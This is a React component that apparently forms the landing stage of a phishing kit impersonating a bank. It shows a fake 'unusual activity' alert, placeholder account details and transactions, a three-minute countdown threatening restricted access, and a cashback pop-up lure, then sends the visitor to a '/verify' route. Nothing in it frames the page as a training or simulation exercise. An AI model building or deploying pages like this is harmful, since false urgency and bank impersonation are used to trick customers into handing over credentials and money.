import { useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import Footer from "../components/Footer";

const BankVerification = () => {
  const navigate = useNavigate();

  const [showForm, setShowForm] = useState(false);
  const [timeLeft, setTimeLeft] = useState(3 * 60);
  const [showAd, setShowAd] = useState(true);

  useEffect(() => {
    if (!showForm) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev <= 1 ? (clearInterval(timer), 0) : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [showForm]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")} : ${secs.toString().padStart(2, "0")}`;
  };

  // Initial alert
  if (!showForm) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white px-4">
        <div className="w-full max-w-3xl border border-gray-300 p-8 bg-white shadow-lg rounded-lg text-center">
          <img src="/bank-logo.png" alt="Bank Logo" className="mx-auto mb-4 w-36" />
          <h2 className="text-[#00733E] font-bold text-xl mb-2">Important Security Alert</h2>
          <p className="text-gray-800 mb-4 text-left">
            Customer ID: <strong>0000-1234-5678-90</strong><br />
            Dear Valued Customer,<br />
            Our records indicate unusual activity on your account. To maintain uninterrupted access and ensure your account's security,
            please review your account details and proceed to secure verification.
          </p>
          <button
            onClick={() => setShowForm(true)}
            className="inline-block bg-[#00733E] text-white font-semibold py-2 px-4 rounded-lg hover:bg-[#00572D] transition"
          >
            Review Account Details
          </button>
        </div>
      </div>
    );
  }

  // Enhanced Bank Info Page
  return (
    <div className="flex flex-col min-h-screen w-full">
      <div className="flex-grow flex flex-col items-center justify-center bg-gray-50 px-4">
        {showAd && (
          <div className="fixed top-20 right-10 bg-white shadow-lg border border-gray-300 p-6 rounded-xl z-50 w-96">
            <h3 className="font-bold text-gray-800 mb-2">🎁 Special Offer!</h3>
            <p className="text-gray-600 text-sm mb-4">
              Update your account now and get 10% cashback on your next transaction!
            </p>
            <button
              onClick={() => setShowAd(false)}
              className="bg-red-500 hover:bg-red-600 text-white py-2 px-4 rounded-lg font-semibold text-sm"
            >
              Close
            </button>
          </div>
        )}

        <div className="w-full max-w-6xl bg-white shadow-xl rounded-2xl p-12 border border-gray-200 m-4">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="flex justify-center items-center gap-2 mb-3">
              <span className="text-green-600 text-2xl">🔒</span>
              <span className="text-sm text-gray-600">Secure Account Review</span>
            </div>
            <h1 className="text-4xl font-bold text-gray-800 mb-3">
              Important Account Notice
            </h1>
            <p className="text-gray-600 mt-2 text-lg">
              Review your account information to maintain uninterrupted banking access.
            </p>
          </div>

          {/* Alert */}
          <div className="bg-red-50 border border-red-200 text-red-700 text-base rounded-lg p-5 mb-8">
            ⚠️ <strong>Urgent:</strong> Your account requires review. Failure to act within 3 minutes may limit certain transactions.
          </div>

          {/* Detailed Bank Info */}
          <div className="mb-8 space-y-6 text-gray-700">
            <h2 className="font-semibold text-xl mb-2">Account Overview</h2>
            <ul className="list-disc list-inside space-y-1">
              <li>Customer ID: <strong>0000-1234-5678-90</strong></li>
              <li>Account Type: <strong>Current / Checking</strong></li>
              <li>Account Balance: <strong>PKR 125,430.00</strong></li>
              <li>Registered Email: <strong>user@example.com</strong></li>
              <li>Registered Phone: <strong>+92 300 1234567</strong></li>
              <li>Last Login: <strong>02-Jan-2026, 14:35</strong></li>
            </ul>

            <h2 className="font-semibold text-xl mt-4 mb-2">Recent Transactions</h2>
            <div className="overflow-x-auto">
              <table className="w-full border border-gray-200 rounded-lg text-left">
                <thead className="bg-gray-100">
                  <tr>
                    <th className="p-3 border-b">Date</th>
                    <th className="p-3 border-b">Description</th>
                    <th className="p-3 border-b">Amount (PKR)</th>
                    <th className="p-3 border-b">Status</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="hover:bg-gray-50">
                    <td className="p-3 border-b">31-Dec-2025</td>
                    <td className="p-3 border-b">Utility Payment</td>
                    <td className="p-3 border-b">-2,500.00</td>
                    <td className="p-3 border-b text-green-600 font-semibold">Completed</td>
                  </tr>
                  <tr className="hover:bg-gray-50">
                    <td className="p-3 border-b">30-Dec-2025</td>
                    <td className="p-3 border-b">Salary Credit</td>
                    <td className="p-3 border-b">+45,000.00</td>
                    <td className="p-3 border-b text-green-600 font-semibold">Completed</td>
                  </tr>
                  <tr className="hover:bg-gray-50">
                    <td className="p-3 border-b">28-Dec-2025</td>
                    <td className="p-3 border-b">Online Shopping</td>
                    <td className="p-3 border-b">-3,200.00</td>
                    <td className="p-3 border-b text-green-600 font-semibold">Completed</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <h2 className="font-semibold text-xl mt-4 mb-2">Security Tips</h2>
            <ul className="list-disc list-inside space-y-1 text-gray-600 text-sm">
              <li>Never share your password or OTP with anyone.</li>
              <li>Always log out after using shared devices.</li>
              <li>Check your account regularly for any unauthorized activity.</li>
              <li>Contact support immediately if you notice suspicious transactions.</li>
            </ul>
          </div>

          {/* Countdown */}
          <div className="bg-gray-100 rounded-lg p-5 text-center mb-8">
            <p className="text-sm text-gray-600 mb-1">Time Remaining</p>
            <p className="text-2xl font-semibold text-gray-800">{formatTime(timeLeft)}</p>
          </div>

          {/* CTA */}
          <button
            onClick={() => navigate("/verify")}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-lg transition mb-6 text-lg"
          >
            Proceed to Secure Verification
          </button>

          {/* Help */}
          <div className="text-center text-gray-500 text-sm mb-6">
            <p>
              Need help? Call our support: <strong>+92 300 1234567</strong>
            </p>
            <p>
              Or visit our <span className="text-blue-600 underline cursor-pointer">Help Center</span>
            </p>
          </div>

          <Footer />
        </div>
      </div>
    </div>
  );
};

export default BankVerification;
